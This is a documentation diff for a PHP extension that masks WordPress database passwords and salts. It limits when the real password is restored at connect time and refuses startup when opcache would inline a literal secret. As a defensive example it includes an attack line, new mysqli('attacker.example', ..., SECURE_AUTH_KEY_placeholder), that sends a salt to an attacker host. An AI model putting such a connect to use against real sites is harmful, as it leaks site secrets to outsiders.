@@ -149,6 +149,11 @@ Nothing implicit decides where a secret comes from: a bare name with no `from` i
 
 Setting `from` also protects that file; `env` secrets need no file.
 
+`dbHost` (optional): the database host the DB password may ever be sent to (see **Point of use**).
+Normally left unset — the extension reads WordPress's `DB_HOST` constant, the way WordPress does.
+Set it only where there is no such constant to read; a host is never guessed, so an unknown host
+means the swap is refused.
+
 ### How it works
 
 - **At MINIT**, in the fpm master before it forks: read every real value (from its `env` variable
@@ -163,10 +168,23 @@ Setting `from` also protects that file; `env` secrets need no file.
   the placeholder for any value that matches a secret; `define()` of a secret name is forced to
   the placeholder; and `$_ENV`/`$_SERVER` carry only placeholders because php-fpm builds them from
   the masked `environ`.
-- **Point of use:** `mysqli_connect`, `mysqli_real_connect`, `new mysqli` and `new PDO` get the
-  placeholder swapped for the real password inside the handler, in the call frame, before the
-  engine's own function runs — so the real value reaches libmysql/PDO and never a PHP zval the
-  caller keeps.
+- **Point of use:** `mysqli_connect`, `mysqli_real_connect`, `mysqli::real_connect`, `new mysqli`
+  and `new PDO` restore the real DB password in the call frame, before the engine's own function
+  runs — so the real value reaches libmysql/PDO and never a PHP zval the caller keeps. The real
+  value is about to leave the process, so the swap happens **only when all three hold**, and is
+  refused (and recorded) otherwise — in `log` mode too, because leaking a secret is never "log and
+  allow":
+  - **the DB password only** — never a salt. The DB password is the single secret restored at a
+    connect boundary; a salt placeholder handed to a connect as the password is refused, not
+    swapped (otherwise a component could read `new mysqli('attacker.example', 'x',
+    SECURE_AUTH_KEY_placeholder)` and collect the salt).
+  - **the caller is core** — by E2a's `frame` attribution (the innermost user-code frame that
+    makes the call), so WordPress's `wpdb` counts and a plugin's own `new mysqli` does not.
+  - **the host is the configured DB host** — `layer2.vault.dbHost`, or the `DB_HOST` constant —
+    compared after normalising the `p:` prefix, a `:port` and a socket path
+    ([`config/src/dbhost.rs`](config/src/dbhost.rs)). A component pointing a connect at its own
+    server never matches, so the password is not sent there even over a cleartext or
+    RSA-under-attacker-key auth exchange.
 - **Salts:** the mu-plugin `securecore-vault.php` (installed in `wp-content/mu-plugins`, so it
   loads before `pluggable.php`) defines `wp_salt()` and `wp_hash()` over the extension's native
   `securecore_vault_salt`/`securecore_vault_hash`. `wp_hash()` computes `hash_hmac($algo, $data,
@@ -195,12 +213,23 @@ opcache's shared memory. Two consequences, both measured on the stack:
   value; with it off, the extension's handler masks it.) The plaintext also sits in shared memory
   for the life of the process.
 
-So a secret written as a bare literal in wp-config.php cannot be hidden by the engine. The
-**vault file is the answer**: the secret lives in a root-only file outside the docroot, never
-enters a PHP file, and so never becomes a constant literal or an opcache operand. Expression
-defines (`define('NAME', getenv('NAME'))`, the Docker image's and the standard managed-WordPress
-form) are not inlined, so the `wpConfig` source is safe for them; the environment and the vault
-file are safe for everything.
+So a secret written as a bare literal in wp-config.php cannot be hidden by the engine. **This
+fails closed:** at MINIT, if `from` is `wpConfig` and any secret is a bare name (so it is read as
+a string literal) while opcache is loaded, the extension refuses to start, naming the secret:
+
+```
+PHP Warning:  PHP Startup: securecore: layer2.vault: DB_PASSWORD is a string literal in
+wp-config.php and opcache inlines it (DECLARE_CONST), so the vault cannot hide it; move it to a
+vault file (from.vaultFile) or an environment variable (secrets[].env); refusing to start
+```
+
+(opcache's own ini values are not yet applied when this module starts, so the optimizer level
+can't be read there; a standard build turns the optimizer on, so the check treats a literal as
+un-hideable whenever opcache is loaded. With no opcache at all, a literal `define()` stays a real
+call the extension masks.) The **vault file is the answer**: the secret lives in a root-only file
+outside the docroot, never enters a PHP file, and so never becomes a constant literal or an opcache
+operand. Expression defines (`define('NAME', getenv('NAME'))`, the Docker image's and the standard
+managed-WordPress form) are not literals, so env-mapped secrets and the vault file are unaffected.
 
 ## `securecore_status(): array`
 
@@ -484,9 +513,13 @@ gelada stacks its filters on top of it.
   the constants, `$wpdb` dumped, `wp_salt`/`wp_hash`, the vault file and wp-config, reflection,
   serialize, debug_backtrace and the error log) and must see only placeholders, in enforce and in
   log mode; the DB connects and nonces, auth cookies and password reset round-trip; `wp_hash` is
-  byte-identical to a known-salt HMAC; the backstop masks the salt env vars (names only); and the
-  revert proof — with the vault gone from the config, and with the extension unloaded, the probe
-  does see the secret — plus Classic Editor, Yoast and CF7 front/login 200.
+  byte-identical to a known-salt HMAC; the backstop masks the salt env vars (names only). It also
+  drives the connect boundary: a probe connects to a fake MySQL server that forces clear-text auth,
+  and the captured bytes must never carry the real password or a salt — the swap is refused for a
+  plugin, for a foreign host and for a salt placeholder (enforce and log), while core still
+  connects. And it checks the opcache fail-closed refusal (a literal `wpConfig` secret stops
+  php-fpm) and the revert proof — with the vault gone from the config, and with the extension
+  unloaded, the probe does see the secret — plus Classic Editor, Yoast and CF7 front/login 200.
 - `DOCKER_CONTEXT=colima bench/vault.sh` (after ext-config.sh): front-page p50 and a login round,
   7 rounds, with the vault on vs a no-vault config.
 - `DOCKER_CONTEXT=colima bench/ext.sh`: front-page p50 with the extension loaded vs not.
